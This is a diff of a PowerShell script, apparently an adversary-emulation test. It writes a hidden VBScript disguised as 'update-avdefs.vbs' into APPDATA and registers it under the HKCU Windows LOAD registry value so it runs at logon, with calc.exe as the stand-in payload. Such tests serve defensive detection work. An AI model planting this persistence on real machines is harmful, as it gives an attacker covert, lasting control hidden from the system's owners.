@@ -1,9 +1,7 @@
-$tmpdir = $env:APPDATA
-$payloadvbsloaderpath = "$tmpdir\update-avdefs.vbs"
-$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
-$vbs += 'oShell.run(""),0,true'
-$vbs | Out-File $payloadvbsloaderpath -Force
-$fileObj = get-item $payloadvbsloaderpath -Force
+$vbsPath = "$env:APPDATA\update-avdefs.vbs"
+$command = "calc.exe"
+"Set oShell = CreateObject ('WScript.Shell'):oShell.run '$($command)'" > $env:APPDATA\update-avdefs.vbs
+$fileObj = get-item $vbsPath -Force
 $fileObj.Attributes="Hidden"
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $vbsPath
 Test-Path  $env:APPDATA\update-avdefs.vbs -PathType Leaf
